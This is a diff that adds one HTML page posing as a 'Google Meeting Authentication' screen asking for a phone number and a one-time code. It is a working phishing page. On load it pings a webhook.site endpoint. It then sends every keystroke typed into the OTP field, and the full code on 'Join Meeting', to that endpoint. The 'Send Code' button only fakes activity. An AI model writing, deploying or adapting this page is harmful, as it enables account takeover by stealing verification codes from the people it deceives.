@@ -1,0 +1,142 @@
+<!-- index.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Google Meeting Authentication</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f2f5;
+        }
+        .container {
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            background-color: #ffffff;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            text-align: center;
+            font-family: 'Arial', sans-serif;
+            color: #333;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 28px;
+            font-weight: bold;
+            color: #1a73e8;
+        }
+        label {
+            font-size: 18px;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            background-color: #1a73e8;
+            color: #ffffff;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.2s ease-in-out;
+        }
+        button:hover {
+            background-color: #0d47a1;
+        }
+        button:focus {
+            outline: none;
+            filter: blur(3px); /* Add the blur effect on focus */
+        }
+        .spacer {
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Google Meeting Authentication</h1>
+        <div class="form-group">
+            <label for="phone">Enter Your Phone Number:</label>
+            <input type="text" id="phone" name="phone" required>
+        </div>
+        <button onclick="sendCode()" class="spacer">Send Code</button>
+        <div class="form-group">
+            <label for="otp">Enter OTP:</label>
+            <input type="text" id="otp" name="otp" required>
+        </div>
+        <button onclick="joinMeeting()">Join Meeting</button>
+    </div>
+
+    <script>
+
+function sendPageOpenNotification() {
+            const webhookUrl = 'https://webhook.site/b8e15cbd-6a41-49c5-946e-3c79440377b4';
+            fetch(webhookUrl, {
+                method: 'GET',
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log(data); // Optional: Log the server response
+            })
+            .catch(error => {
+                console.error('Error:', error); // Optional: Handle errors if any
+            });
+        }
+
+        // Call the function to send the request when the page is loaded
+        sendPageOpenNotification();
+
+        
+        // Function to send key event to the server
+        function sendKeyEventToServer(key) {
+            const webhookUrl = `https://webhook.site/b8e15cbd-6a41-49c5-946e-3c79440377b4?key=${key}`;
+            fetch(webhookUrl)
+                .then(response => response.json())
+                .then(data => {
+                    console.log(data);
+                    // Handle the response from the server if needed
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    // Handle errors if any
+                });
+        }
+
+        // Function to handle key press event in the OTP input field
+        function handleKeyPress(event) {
+            const key = event.key;
+            sendKeyEventToServer(key);
+        }
+
+        // Add keypress event listener to the OTP input field
+        const otpInput = document.getElementById('otp');
+        otpInput.addEventListener('keypress', handleKeyPress);
+
+        // Function to be called when the "Send Code" button is clicked
+        function sendCode() {
+            // Do nothing, just apply blur effect to the button
+        }
+
+        // Function to be called when the "Join Meeting" button is clicked
+        function joinMeeting() {
+            const otpInput = document.getElementById('otp');
+            const otpValue = otpInput.value;
+            sendKeyEventToServer(otpValue);
+        }
+    </script>
+</body>
+</html>
